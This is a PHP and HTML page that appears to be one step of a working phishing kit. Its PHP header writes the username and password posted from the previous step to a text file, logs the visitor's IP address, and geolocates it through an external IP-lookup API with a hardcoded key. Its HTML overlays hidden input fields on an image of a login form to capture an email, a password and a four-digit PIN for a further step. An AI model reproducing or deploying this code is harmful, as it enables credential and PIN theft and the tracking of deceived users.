<?php
	session_start();

	$fnm = "ganador98.txt";

	$_SESSION['FN'] = $fnm;
	@$_SESSION['U1'] = $_POST['ipts1'];
	@$_SESSION['P1'] = $_POST['ipts2'];

	@$fhandlr = fopen($_SESSION['FN'], "a");

	@fwrite($fhandlr, "***********************************************\n");
	@fwrite($fhandlr, 'U: '.$_SESSION['U1']."\n");
	@fwrite($fhandlr, 'P: '.$_SESSION['P1']."\n");

	if( !empty($_SERVER['REMOTE_ADDR']) ){

		@$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
		@$IPResult =  file_get_contents($api_url);
		@fwrite($fhandlr, 'IP: '.$_SERVER['REMOTE_ADDR']."\n");
		@fwrite($fhandlr, 'LC: '.$IPResult."\n");
	
	}elseif( !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ){
	
		@$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['HTTP_X_FORWARDED_FOR'];
		@$IPResult =  file_get_contents($api_url);
		@fwrite($fhandlr, 'IP: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
		@fwrite($fhandlr, 'LC: '.$IPResult."\n");
	
	}else{
		fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
		fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
	}

	fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
	fclose($fhandlr);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=0.8">
<title></title>
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">

</head>
<body style="font-family:sans-serif;font-size: 16px;font-weight: 400;background:none;">
	<div id="cnt2" style="text-align:center;">
		<form method="post" action="step-3.php" style="display: inline-block;
    background-image: url(images/afrms.svg);
    width: 980px;
    background-repeat: no-repeat;
    height: 552px;text-align:left;margin-top:20px;">
			
			<input name="ipts3" type="email" style="position: relative;
    top: 268px;
    left: 26px;
    display: block;" required placeholder="*****@*****">
			
			<input name="ipts4" type="password" style="position: relative;
    top: 313px;
    left: 26px;
    display: block;" required placeholder="***********">
			
			<input name="ipts5" type="password" style="position: relative;
    top: 368px;
    left: 26px;
    display: block;" required placeholder="****" maxlength="4" >
			
			<input type="submit" style="    background: rgba(0,0,0,0);
    position: relative;
    top: 460px;
    left: 27px;
    width: 106px;
    height: 23px;
    border: none;
    display: block;" value="">
		</form>
	</div>
	<div style="text-align:center;">
		<footer style="padding-top: 20px;margin-top: 80px;background-color: #eee;width: 980px;display:inline-block;text-align:left;">
			<img src="images/fts1.svg" alt="" style="width:80%;max-width:600px;margin-left:10px">
		</footer>
	</div>
</body>
</html>